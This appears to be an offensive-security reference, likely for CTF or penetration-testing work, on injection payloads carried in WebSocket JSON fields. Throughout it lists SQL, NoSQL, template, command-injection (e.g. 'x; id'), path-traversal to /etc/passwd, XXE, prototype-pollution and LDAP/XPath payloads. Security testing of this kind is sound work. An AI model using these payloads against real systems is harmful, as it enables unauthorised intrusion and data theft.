# Injection in frames — the schema fields as payload carriers

## The field-is-an-injection-surface model

Every string/JSON field in the message schema reaches a sink — a query,
a template, a file path, a command, a deserialization. The frame
carries the payload; the payload's class owns the exploit.

## SQL injection in a frame field

```json
{"action":"search","q":"' OR 1=1--"}
{"action":"read","id":"1' OR '1'='1"}
{"action":"filter","where":"name='x' OR SLEEP(2)--"}
{"action":"get","id":"admin' UNION SELECT flag--"}
```

A `q`/`search`/`filter`/`id`/`where`/`order`/`sort` field reaching an
SQL query — `web-sqli`. A timing/error/boolean/UNION oracle over the
frame; the reply carries the extraction.

## NoSQL/operator injection

```json
{"action":"login","user":"admin","pass":{"$ne":null}}
{"action":"find","q":{"$where":"..."}}
{"action":"read","id":{"$gt":""}}
{"filter":{"$regex":".*"}}
```

An operator object in a frame field reaching a document query —
`web-nosqli`. The `{"$ne"}`/`{"$gt"}`/`{"$where"}`/`{"$regex"}` bypass.

## SSTI in a rendered field

```json
{"action":"greet","name":"{{7*7}}"}
{"action":"render","tpl":"${7*7}"}
{"action":"send","text":"<%= 7*7 %>"}
```

A `name`/`text`/`tpl`/`msg`/`subject` field rendered by a template —
`web-ssti`. The arithmetic marker `{{7*7}}`→`49` confirms.

## Command injection

```json
{"action":"ping","host":"x; id"}
{"action":"convert","file":"x|id"}
{"action":"exec","cmd":"id"}
{"action":"render","input":"x$(id)"}
```

A `host`/`file`/`cmd`/`input`/`domain`/`url` field reaching a shell —
`web-command-injection`. The `;`/`|`/`$()`/`` ` `` separator.

## Path traversal / file read

```json
{"action":"read","file":"../../etc/passwd"}
{"action":"load","path":"/flag"}
{"action":"attachment","name":"../../../etc/passwd"}
{"action":"export","doc":"file:///flag"}
```

A `file`/`path`/`name`/`doc`/`template` field reaching a file-read —
`file-read-primitives`/`web-lfi`.

## XXE / deserialization

```json
{"action":"parse","xml":"<?xml version='1.0'?><!DOCTYPE r[<!ENTITY x SYSTEM 'file:///flag'>]><r>&x;</r>"}
{"action":"import","data":"<serialized-object>"}
```

An XML/serialized field — `web-xxe`/`web-deserialization`. A binary
frame that is a serialized object → `web-deserialization`.

## Prototype pollution

```json
{"action":"merge","obj":{"__proto__":{"isAdmin":true}}}
{"action":"set","key":"__proto__.x","value":1}
{"action":"config","__proto__":{"role":"admin"}}
```

A `__proto__`/`constructor`/`prototype` key in the frame's JSON —
`web-prototype-pollution`. The merge/assign sink.

## LDAP/XPath/misc

```json
{"action":"lookup","name":"*)(uid=admin)"}
{"action":"query","xpath":"' or 1=1 or 'a'='a"}
```

A `name`/`filter`/`xpath`/`query` reaching an LDAP/XPath sink.

## The injection boundary rule

The FRAME is the carrier — the class is the payload's. A `{"q":"' OR
1=1"}` is `web-sqli` delivered over WS; the `{"action":"read","id":
<victim>}` is `web-websocket`'s message-IDOR. Record the transport
(WS) + the payload class; route the exploit to the payload's depth skill.
